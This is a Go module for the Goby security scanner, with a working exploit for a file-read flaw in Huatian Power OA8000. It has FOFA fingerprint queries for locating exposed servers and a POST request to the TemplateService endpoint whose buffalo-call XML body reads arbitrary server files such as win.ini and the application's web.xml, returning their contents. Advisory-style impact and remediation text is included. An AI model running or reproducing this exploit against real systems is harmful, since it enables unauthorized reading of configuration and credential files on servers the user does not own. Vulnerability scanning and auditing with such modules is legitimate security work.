package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Huatian Power OA getHtmlContent file reading vulnerability",
    "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management models, software technology, and network technology to provide users with a low-cost, high-efficiency collaborative office and management platform. By using Huatian Power's collaborative office platform, wise managers have achieved good results in strengthening standardized work processes, strengthening team execution, promoting fine management, and promoting business growth. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2022-11-28",
    "Author": "1angx",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.oa8000.com\">http://www.oa8000.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "select",
            "value": "c:\\windows\\win.ini,c:\\windows\\system.ini,D:/htoa/Tomcat/webapps/OAapp/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/TemplateService",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call>\n<method>getHtmlContent</method>\n<string>c:/windows/win.ini</string>\n</buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sstateflag",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/TemplateService",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call>\n<method>getHtmlContent</method>\n<string>{{{filePath}}}</string>\n</buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "华天动力 OA getHtmlContent 文件读取漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.oa8000.com\">http://www.oa8000.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "信创"
            ]
        },
        "EN": {
            "Name": "Huatian Power OA getHtmlContent file reading vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management models, software technology, and network technology to provide users with a low-cost, high-efficiency collaborative office and management platform. By using Huatian Power's collaborative office platform, wise managers have achieved good results in strengthening standardized work processes, strengthening team execution, promoting fine management, and promoting business growth. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.oa8000.com\">http://www.oa8000.com</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
